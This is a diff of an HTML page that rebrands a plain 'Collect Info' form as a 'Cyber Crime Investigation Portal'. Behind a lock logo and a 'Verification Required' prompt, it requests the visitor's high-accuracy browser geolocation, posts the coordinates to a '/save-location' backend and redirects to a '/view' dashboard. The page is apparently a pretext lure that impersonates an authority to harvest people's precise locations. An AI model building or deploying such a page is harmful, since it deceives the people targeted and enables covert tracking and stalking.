@@ -4,18 +4,18 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Verification Portal</title>
+<title>Cyber Crime Investigation Portal</title>
 
 <style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial,sans-serif;
+    font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 }
 
 body{
-    background:#f5f7fa;
+    background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     min-height:100vh;
     display:flex;
     justify-content:center;
@@ -25,47 +25,75 @@ body{
 
 .card{
     width:100%;
-    max-width:400px;
+    max-width:450px;
     background:#fff;
-    padding:30px;
+    padding:40px;
     border-radius:20px;
-    box-shadow:0 5px 20px rgba(0,0,0,.1);
+    box-shadow:0 20px 60px rgba(0,0,0,0.3);
     text-align:center;
+    animation:fadeIn 0.5s ease-in;
+}
+
+@keyframes fadeIn{
+    from{
+        opacity:0;
+        transform:translateY(-20px);
+    }
+    to{
+        opacity:1;
+        transform:translateY(0);
+    }
+}
+
+.logo{
+    font-size:48px;
+    margin-bottom:20px;
 }
 
 h2{
-    margin-bottom:15px;
+    color:#333;
+    margin-bottom:10px;
+    font-size:28px;
 }
 
-p{
+.subtitle{
     color:#666;
-    margin-bottom:20px;
+    margin-bottom:30px;
+    font-size:14px;
 }
 
 button{
     width:100%;
     border:none;
-    padding:14px;
+    padding:16px;
     border-radius:10px;
     background:#2563eb;
     color:white;
     font-size:16px;
     cursor:pointer;
+    transition:all 0.3s;
+    font-weight:600;
 }
 
 button:hover{
-    opacity:.9;
+    background:#1d4ed8;
+    transform:translateY(-2px);
+    box-shadow:0 5px 15px rgba(37,99,235,0.3);
+}
+
+button:active{
+    transform:translateY(0);
 }
 
 .loader{
     display:none;
-    width:60px;
-    height:60px;
-    border:6px solid #ddd;
-    border-top:6px solid #2563eb;
+    width:50px;
+    height:50px;
+    border:4px solid #e5e7eb;
+    border-top:4px solid #2563eb;
     border-radius:50%;
     margin:20px auto;
-    animation:spin 1s linear infinite;
+    animation:spin 0.8s linear infinite;
 }
 
 @keyframes spin{
@@ -75,8 +103,35 @@ button:hover{
 }
 
 #status{
+    margin-top:20px;
+    font-size:14px;
+    padding:12px;
+    border-radius:8px;
+}
+
+.success{
+    background:#d1fae5;
+    color:#065f46;
+}
+
+.error{
+    background:#fee2e2;
+    color:#991b1b;
+}
+
+.info{
+    background:#e0e7ff;
+    color:#3730a3;
+}
+
+.hidden{
+    display:none;
+}
+
+.redirect-message{
     margin-top:15px;
-    font-size:16px;
+    font-size:12px;
+    color:#6b7280;
 }
 </style>
 </head>
@@ -85,19 +140,23 @@ button:hover{
 
 <div class="card">
 
-    <h2>Collect Info</h2>
+    <div class="logo">🔒</div>
 
-    <p>
-        Basic information may be collected for verification.
-    </p>
+    <h2>Verification Required</h2>
 
-    <button onclick="startVerification()">
-        Continue
+    <div class="subtitle">
+        Your location will be collected for security verification
+    </div>
+
+    <button id="verifyBtn" onclick="startVerification()">
+        Continue to Verification
     </button>
 
     <div class="loader" id="loader"></div>
 
     <div id="status"></div>
+
+    <div class="redirect-message" id="redirectMsg"></div>
 
 </div>
 
@@ -105,10 +164,17 @@ button:hover{
 
 function startVerification(){
 
-    document.getElementById("loader").style.display = "block";
+    // Disable button to prevent multiple clicks
+    const btn = document.getElementById("verifyBtn");
+    btn.disabled = true;
+    btn.style.opacity = "0.6";
+    btn.textContent = "Processing...";
 
-    document.getElementById("status").innerHTML =
-        "Requesting permission...";
+    document.getElementById("loader").style.display = "block";
+    
+    const statusDiv = document.getElementById("status");
+    statusDiv.className = "info";
+    statusDiv.innerHTML = "📍 Requesting location permission...";
 
     getLocation();
 }
@@ -119,9 +185,9 @@ function getLocation() {
 
     if (!navigator.geolocation) {
 
-        statusBox.innerHTML =
-            "Geolocation not supported.";
-
+        statusBox.className = "error";
+        statusBox.innerHTML = "❌ Geolocation is not supported by your browser";
+        resetButton();
         return;
     }
 
@@ -129,17 +195,16 @@ function getLocation() {
 
         function(position){
 
-            statusBox.innerHTML =
-                "Sending location...";
+            statusBox.className = "info";
+            statusBox.innerHTML = "📡 Sending location data to server...";
 
+            // Send to Flask backend
             fetch('/save-location', {
 
                 method:'POST',
-
                 headers:{
                     'Content-Type':'application/json'
                 },
-
                 body:JSON.stringify({
                     latitude:position.coords.latitude,
                     longitude:position.coords.longitude,
@@ -152,44 +217,81 @@ function getLocation() {
 
             .then(data => {
 
-                document.getElementById("loader").style.display =
-                    "none";
+                document.getElementById("loader").style.display = "none";
 
-                statusBox.innerHTML =
-                    "✅ Verification completed.";
+                if(data.status === "success"){
+                    statusBox.className = "success";
+                    statusBox.innerHTML = "✅ Verification completed successfully!";
+                    
+                    // Show redirect message
+                    document.getElementById("redirectMsg").innerHTML = 
+                        "Redirecting to dashboard in 3 seconds...";
+                    
+                    // Optional: Redirect to dashboard after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = "/view";
+                    }, 3000);
+                } else {
+                    statusBox.className = "error";
+                    statusBox.innerHTML = "❌ Server error: " + data.message;
+                    resetButton();
+                }
 
+            })
+
+            .catch(error => {
+                document.getElementById("loader").style.display = "none";
+                statusBox.className = "error";
+                statusBox.innerHTML = "❌ Network error! Please try again.";
+                console.error("Fetch error:", error);
+                resetButton();
             });
 
         },
 
         function(error){
 
-            document.getElementById("loader").style.display =
-                "none";
+            document.getElementById("loader").style.display = "none";
 
-            let msg = "Permission denied";
-
-            if(error.code === 2){
-                msg = "Location unavailable";
+            let msg = "";
+            
+            switch(error.code){
+                case 1:
+                    msg = "Permission denied. Please allow location access.";
+                    break;
+                case 2:
+                    msg = "Location unavailable. Please check your GPS.";
+                    break;
+                case 3:
+                    msg = "Request timeout. Please try again.";
+                    break;
+                default:
+                    msg = "Unknown error occurred.";
             }
 
-            if(error.code === 3){
-                msg = "Request timeout";
-            }
-
-            statusBox.innerHTML =
-                "❌ " + msg;
-
+            statusBox.className = "error";
+            statusBox.innerHTML = "❌ " + msg;
+            resetButton();
         },
 
         {
-            enableHighAccuracy:true,
-            timeout:15000,
-            maximumAge:0
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
         }
 
     );
 }
+
+function resetButton() {
+    const btn = document.getElementById("verifyBtn");
+    btn.disabled = false;
+    btn.style.opacity = "1";
+    btn.textContent = "Try Again";
+    document.getElementById("loader").style.display = "none";
+}
+
+// Optional: Auto redirect if already verified? (No need)
 </script>
 
 </body>
